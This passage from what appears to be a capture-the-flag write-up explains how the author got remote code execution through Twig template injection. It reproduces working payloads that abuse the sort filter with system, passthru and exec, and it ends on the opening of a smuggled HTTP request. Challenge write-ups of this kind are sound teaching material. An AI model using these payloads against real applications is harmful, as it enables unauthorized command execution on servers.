So closures are anonymous functions, which lead me to believe that non closures are named functions. I tried passing in `system` without the quotes to no success, but I recalled in PHP the existence of [variable functions](https://waituck.sg/web/rctf2020/php/2020/06/10/rctf-2020-calc-writeup.html#:~:text=PHP%20known%20as-,variable%20functions,-.%20From%20the%20PHP), which allows calling functions from their string representation. Even with that knowledge, it wasn't sufficient, and I knew that something like this would have appeared in a CTF somewhere, so I went to look for Twig templating payloads, and eventually, I ended looking at this [blog enumerating payloads for Twig](https://chowdera.com/2022/159/202206080644355675.html) which provided the following payload:

{% raw %} 
```php
{
   {["id", 0]|sort("system")}}
{
   {["id", 0]|sort("passthru")}}
{
   {["id", 0]|sort("exec")}}    //  No echo 
```
{% endraw %} 

Passing in an array with more than one element was quite important as it turned out. In any case, this gives us exactly what we need to trigger the RCE, thus solving the challenge.

{% raw %} 
```
POST / HTTP/2
Host: 127.0.0.1:1337

aPOST /admin/export HTTP/1.0
